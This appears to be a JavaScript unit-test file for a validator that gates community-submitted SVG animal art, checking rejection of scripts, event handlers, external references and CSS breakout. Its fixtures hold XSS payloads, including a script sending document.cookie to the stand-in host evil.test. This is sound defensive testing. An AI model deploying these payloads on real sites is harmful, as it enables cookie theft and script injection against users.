/**
 * Unit tests for the animal descriptor core (the community-animal intake
 * contract gate + fail-closed SVG pre-scan + safe codegen).
 *
 * Run: node --test scripts/animal-descriptor.test.mjs
 *
 * The emphasis is the security surface: declarative-only (no JS/custom), the
 * SVG denylist, the baked⟹memorial rule, strict HSL (CSS-injection defence),
 * and that codegen can't break out into executable code.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  validateDescriptor,
  quickRejectSvg,
  svgNestingDepth,
  slugifyAnimal,
  codegenAnimalModule,
  buildEnvelope,
} from "./animal-descriptor.mjs";

const PARTS_Q = {
  body: '<path d="M1,2 L3,4" fill="hsl(var(--animal-fur))"/>',
  frontLeftLeg: '<g class="cat-fl-lower"><line x1="1" y1="2" x2="3" y2="4" stroke="hsl(var(--animal-fur))"/></g>',
  frontRightLeg: '<g class="cat-fr-lower"><line x1="1" y1="2" x2="3" y2="4" stroke="hsl(var(--animal-fur))"/></g>',
  backLeftLeg: '<g class="cat-bl-lower"><line x1="1" y1="2" x2="3" y2="4" stroke="hsl(var(--animal-fur))"/></g>',
  backRightLeg: '<g class="cat-br-lower"><line x1="1" y1="2" x2="3" y2="4" stroke="hsl(var(--animal-fur))"/></g>',
  tail: '<path d="M1,2 L3,4" stroke="hsl(var(--animal-fur))" fill="none"/>',
  head: '<path d="M1,2 L3,4" fill="hsl(var(--animal-fur))"/>',
  eyes: '<circle cx="1" cy="2" r="3" fill="hsl(var(--animal-eye))"/>',
  face: '<path d="M1,2 L3,4" stroke="hsl(var(--animal-nose))" fill="none"/>',
};

function baseAnimal(overrides = {}) {
  return {
    id: "fennec",
    name: "Fennec Fox",
    type: "quadruped",
    license: "CC-BY-4.0",
    colors: { "--animal-eye": "40 30% 20%", "--animal-fur": "30 60% 70%" },
    parts: { ...PARTS_Q },
    ...overrides,
  };
}

const errs = (r) => r.errors.join("\n");

test("[AD-1] valid themeable quadruped passes + stamps community source", () => {
  const r = validateDescriptor(baseAnimal());
  assert.equal(r.ok, true, errs(r));
  assert.equal(r.animal.source, "community");
  assert.equal(r.animal.memorial, undefined);
  assert.equal(r.animal.id, "fennec");
});

test("[AD-2] type:'custom' is rejected (declarative-only)", () => {
  const r = validateDescriptor(baseAnimal({ type: "custom" }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /custom/i);
});

test("[AD-3] a render field is rejected (no JS callback)", () => {
  const r = validateDescriptor(baseAnimal({ render: "() => {}" }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /render/);
});

test("[AD-4] wingLeft/wingRight (maintainer-only) rejected", () => {
  const r = validateDescriptor(baseAnimal({ wingLeft: "<path/>" }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /wingLeft/);
});

test("[AD-5] <script> in a part is rejected", () => {
  const bad = baseAnimal();
  bad.parts.body += '<script>alert(1)</script>';
  const r = validateDescriptor(bad);
  assert.equal(r.ok, false);
  assert.match(errs(r), /script/i);
});

test("[AD-6] inline event handler is rejected", () => {
  const bad = baseAnimal();
  bad.parts.head = '<circle cx="1" cy="2" r="3" onload="evil()"/>';
  const r = validateDescriptor(bad);
  assert.equal(r.ok, false);
  assert.match(errs(r), /event handler/i);
});

test("[AD-7] <foreignObject> is rejected", () => {
  const bad = baseAnimal();
  bad.parts.body += '<foreignObject><div>x</div></foreignObject>';
  assert.equal(validateDescriptor(bad).ok, false);
});

test("[AD-8] external href is rejected, internal #fragment is fine", () => {
  const ext = baseAnimal();
  ext.parts.body = '<use href="https://evil.test/x.svg"/>' + ext.parts.body;
  assert.equal(validateDescriptor(ext).ok, false);

  const internal = baseAnimal();
  internal.parts.body =
    '<defs><linearGradient id="g"><stop offset="0" stop-color="hsl(var(--animal-fur))"/></linearGradient></defs>' +
    '<rect x="0" y="0" width="1" height="1" fill="url(#g)"/>' +
    internal.parts.body;
  assert.equal(validateDescriptor(internal).ok, true, errs(validateDescriptor(internal)));
});

test("[AD-9] url(http…) rejected; url(#grad) allowed", () => {
  assert.ok(quickRejectSvg('<rect fill="url(https://evil.test/x)"/>'));
  assert.equal(quickRejectSvg('<rect fill="url(#grad)"/>'), null);
  assert.equal(quickRejectSvg("<rect fill=\"url('#grad')\"/>"), null);
});

test("[AD-10] javascript:/data: URIs rejected", () => {
  assert.ok(quickRejectSvg('<a href="javascript:alert(1)"/>'));
  assert.ok(quickRejectSvg('<image href="data:image/svg+xml;base64,xxx"/>'));
});

test("[AD-11] baked animal (only --animal-eye) WITHOUT memorial is rejected", () => {
  const r = validateDescriptor(baseAnimal({ colors: { "--animal-eye": "98 40% 42%" } }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /memorial/i);
});

test("[AD-12] baked animal WITH memorial:true passes (Rainbow Bridge)", () => {
  const r = validateDescriptor(baseAnimal({ colors: { "--animal-eye": "98 40% 42%" }, memorial: true }));
  assert.equal(r.ok, true, errs(r));
  assert.equal(r.animal.memorial, true);
});

test("[AD-13] themeable animal needs no memorial", () => {
  const r = validateDescriptor(baseAnimal());
  assert.equal(r.ok, true, errs(r));
});

test("[AD-14] colors must include --animal-eye", () => {
  const r = validateDescriptor(baseAnimal({ colors: { "--animal-fur": "30 60% 70%" } }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /--animal-eye/);
});

test("[AD-15] a colour value with ; or } (CSS breakout) is rejected", () => {
  const r = validateDescriptor(baseAnimal({ colors: { "--animal-eye": "40 30% 20%", "--animal-fur": "30 60% 70%; } :host{x:y}" } }));
  assert.equal(r.ok, false);
  assert.match(errs(r), /HSL triple/i);
});

test("[AD-16] reserved id (cat) and collisions rejected", () => {
  assert.equal(validateDescriptor(baseAnimal({ id: "cat" })).ok, false);
  assert.equal(validateDescriptor(baseAnimal({ id: "fennec" }), { existingIds: ["fennec"] }).ok, false);
});

test("[AD-17] bad id format rejected", () => {
  for (const id of ["Fennec", "1fox", "a", "x".repeat(40), "fox_x", "fox.x"]) {
    assert.equal(validateDescriptor(baseAnimal({ id })).ok, false, id);
  }
});

test("[AD-18] missing required part rejected", () => {
  const bad = baseAnimal();
  delete bad.parts.tail;
  const r = validateDescriptor(bad);
  assert.equal(r.ok, false);
  assert.match(errs(r), /parts\.tail/);
});

test("[AD-19] unknown part slot rejected", () => {
  const bad = baseAnimal();
  bad.parts.wing = "<path/>";
  assert.equal(validateDescriptor(bad).ok, false);
});

test("[AD-20] licence required + allowlisted", () => {
  assert.equal(validateDescriptor(baseAnimal({ license: "" })).ok, false);
  assert.equal(validateDescriptor(baseAnimal({ license: "WTFPL" })).ok, false);
  assert.equal(validateDescriptor(baseAnimal({ license: "CC0-1.0" })).ok, true);
});

test("[AD-21] oversized part rejected", () => {
  const bad = baseAnimal();
  bad.parts.body = '<path d="' + "M1,2 ".repeat(8000) + '"/>'; // > 32 KB
  assert.equal(validateDescriptor(bad).ok, false);
});

test("[AD-22] parrot requires the parrot slots, not hind legs", () => {
  const parrot = {
    id: "budgie",
    name: "Budgie",
    type: "parrot",
    license: "CC0-1.0",
    colors: { "--animal-eye": "40 30% 20%", "--animal-feather": "120 50% 50%" },
    parts: {
      body: PARTS_Q.body, frontLeftLeg: PARTS_Q.frontLeftLeg, frontRightLeg: PARTS_Q.frontRightLeg,
      tail: PARTS_Q.tail, head: PARTS_Q.head, eyes: PARTS_Q.eyes, face: PARTS_Q.face,
    },
  };
  assert.equal(validateDescriptor(parrot).ok, true, errs(validateDescriptor(parrot)));
});

test("[AD-23] author_url shortener dropped, direct link kept", () => {
  const short = validateDescriptor(baseAnimal({ author: "Pat", author_url: "https://bit.ly/x" }));
  assert.equal(short.ok, true);
  assert.equal(short.animal.author_url, undefined);
  assert.equal(short.meta.authorUrlRejected, true);

  const direct = validateDescriptor(baseAnimal({ author: "Pat", author_url: "https://example.com/pat" }));
  assert.equal(direct.animal.author_url, "https://example.com/pat");
});

test("[AD-24] codegen escapes < > and round-trips to the original parts", () => {
  const r = validateDescriptor(baseAnimal());
  const mod = codegenAnimalModule(r.animal);

  assert.ok(mod.includes('AnimalSVG.register("fennec"'));
  // No raw angle brackets anywhere — all SVG markup is < / > escaped,
  // so the generated source can never break out into executable code.
  assert.ok(!mod.includes("<path"), "raw <path must not appear");
  assert.ok(!/<[a-z]/i.test(mod.replace(/^[\s\S]*?register\(/, "")), "no raw < in the embedded def");
  assert.ok(mod.includes("\\u003c"), "< is escaped to \\u003c");

  // Executing the module registers the ORIGINAL, unescaped parts.
  let captured = null;
  const AnimalSVG = { register: (id, def) => { captured = { id, def }; } };
  // eslint-disable-next-line no-new-func
  new Function("AnimalSVG", mod)(AnimalSVG);
  assert.equal(captured.id, "fennec");
  assert.equal(captured.def.label, "Fennec Fox");
  assert.equal(captured.def.type, "quadruped");
  assert.equal(captured.def.parts.body, r.animal.parts.body);
  assert.equal(captured.def.colors["--animal-eye"], "40 30% 20%");
});

test("[AD-25] codegen carries memorial through", () => {
  const r = validateDescriptor(baseAnimal({ colors: { "--animal-eye": "98 40% 42%" }, memorial: true }));
  const mod = codegenAnimalModule(r.animal);
  let captured = null;
  const AnimalSVG = { register: (id, def) => { captured = def; } };
  new Function("AnimalSVG", mod)(AnimalSVG);
  assert.equal(captured.memorial, true);
});

test("[AD-26] envelope shape", () => {
  const r = validateDescriptor(baseAnimal());
  const env = buildEnvelope(r.animal);
  assert.equal(env.version, 1);
  assert.equal(env.kind, "animal");
  assert.equal(env.animal.id, "fennec");
});

test("[AD-27] slug + nesting helpers", () => {
  assert.equal(slugifyAnimal("Fennec Fox!", 42), "fennec-fox-42");
  assert.equal(slugifyAnimal("", null), "animal");
  assert.ok(svgNestingDepth("<g><g><g></g></g></g>") === 3);
  assert.ok(svgNestingDepth('<path d="x"/>') === 0);
});

// A single plausible-looking-but-hostile submission, the kind a real attacker
// would send: valid metadata, but every part smuggles a payload. This is the
// proof that the scary path is rejected BEFORE the intake is ever trusted —
// one fixture covering <script>, onload=, <foreignObject>, an external <image>
// href, an external <use> ref, and a chrome-targeting class.
function hostileAnimal() {
  return {
    id: "trojan-pup",
    name: "Definitely A Normal Dog",
    type: "quadruped",
    license: "MIT",
    colors: { "--animal-eye": "40 30% 20%", "--animal-fur": "30 60% 70%" },
    parts: {
      body: '<path d="M1,2 L3,4" fill="hsl(var(--animal-fur))"/><script>fetch("https://evil.test/"+document.cookie)</script>',
      head: '<circle cx="1" cy="2" r="3" fill="hsl(var(--animal-fur))" onload="alert(document.domain)"/>',
      tail: '<foreignObject width="1" height="1"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>',
      face: '<image href="https://evil.test/track.gif" width="1" height="1"/>',
      // a chrome-targeting class AND an external sprite reference
      frontLeftLeg: '<g class="evcc-card-root hacked"><use href="https://evil.test/sprite.svg#x"/></g>',
      frontRightLeg: PARTS_Q.frontRightLeg,
      backLeftLeg: PARTS_Q.backLeftLeg,
      backRightLeg: PARTS_Q.backRightLeg,
      eyes: PARTS_Q.eyes,
    },
  };
}

test("[AD-28] HOSTILE fixture — the scary path is rejected, every dangerous vector flagged", () => {
  const r = validateDescriptor(hostileAnimal());
  assert.equal(r.ok, false, "a hostile submission must never validate");
  const joined = r.errors.join("\n");
  assert.match(joined, /script/i, "<script> must be caught");
  assert.match(joined, /event handler/i, "onload= must be caught");
  assert.match(joined, /foreignObject/i, "<foreignObject> must be caught");
  assert.match(joined, /<image>|load external resources/i, "external <image> must be caught");
  assert.match(joined, /#fragment/i, "external href/<use> must be caught");
  // The boring fields (id/name/type/licence/colours) are all valid, so the
  // ONLY reasons this is rejected are the SVG payloads — proving the SVG gate,
  // not some unrelated field. Non-allowlisted classes ("evcc-card-root") are
  // harmless (shadow-DOM encapsulated) and are STRIPPED by the DOMPurify
  // sanitiser (covered by that module's tests), not a rejection vector here.
  assert.ok(r.errors.length >= 5, `expected one rejection per hostile part, got ${r.errors.length}`);
});

test("[AD-29] description accepted + length-capped; submitted_by carried", () => {
  const r = validateDescriptor(baseAnimal({ description: "A themeable red fox.", submitted_by: "Pat" }));
  assert.equal(r.ok, true, errs(r));
  assert.equal(r.animal.description, "A themeable red fox.");
  assert.equal(r.animal.submitted_by, "Pat");
  const long = validateDescriptor(baseAnimal({ description: "x".repeat(500) }));
  assert.equal(long.animal.description.length, 280);
});

test("[AD-30] reserved ids only build first-party (allowReservedIds); source override", () => {
  // community submission can't claim a built-in id
  assert.equal(validateDescriptor(baseAnimal({ id: "cat" })).ok, false);
  assert.equal(validateDescriptor(baseAnimal({ id: "dog" })).ok, false);
  // first-party build of a bundled animal is allowed, and stamps source:core
  const fp = validateDescriptor(baseAnimal({ id: "cat" }), { allowReservedIds: true, source: "core" });
  assert.equal(fp.ok, true, errs(fp));
  assert.equal(fp.animal.source, "core");
});
